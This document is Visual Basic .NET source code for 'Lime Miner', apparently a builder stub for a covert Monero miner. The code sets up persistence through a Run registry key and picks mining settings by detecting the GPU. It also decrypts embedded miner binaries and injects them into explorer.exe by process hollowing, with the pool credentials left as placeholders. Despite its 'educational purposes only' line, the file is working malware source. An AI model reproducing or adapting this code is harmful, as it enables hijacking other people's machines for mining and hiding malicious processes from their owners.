

'       │ Author     : NYAN CAT
'       │ Name       : Lime Miner

'       Contact Me    https : //github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.


Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If



Public Class Program
    Public Shared Sub Main()
#If INS Then
                        Install()
#End If
        KillLastProc()
        Initialize()
    End Sub

#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                Using Drop As New FileStream(PayloadPath, FileMode.Create)
                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                    Drop.Write(Client, 0, Client.Length)
                End Using
                Thread.Sleep(2 * 1000)
                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                Process.Start(PayloadPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub KillLastProc()
        On Error Resume Next
        Dim objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "explorer.exe")
        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
        For Each retObject As Object In colProcess
            If retObject.CommandLine.ToString.Contains("--donate-level=") Then
                retObject.Terminate()
            End If
        Next
    End Sub

    Public Shared Sub Initialize()
        Try
            Dim Args As String = ""
            Dim xmr As Byte() = Nothing

            If GetGPU.ToLower.Contains("nvidia") Then

                If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
                    Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                    For Each folder As String In IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\NVIDIA GPU Computing Toolkit\CUDA")
                        If folder.Contains("v8") Then
                            xmr = GetTheResource("#nvidia")
                        ElseIf folder.Contains("v9") Then
                            xmr = GetTheResource("#nvidia2")
                        End If
                    Next
                Else
                    'if for some reason there is no CUDA...
                    Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
                    xmr = GetTheResource("#cpu")
                End If

            ElseIf GetGPU.ToLower.Contains("amd") Then
                Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
                xmr = GetTheResource("#amd")
            Else
                Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
                xmr = GetTheResource("#cpu")
            End If


            Run(GetTheResource("#dll"), "-B --donate-level=1 -a cryptonight --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function GetGPU() As String
        Try
            Dim VideoCard As String = ""
            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If
            Return ""
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes("#KEY"))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
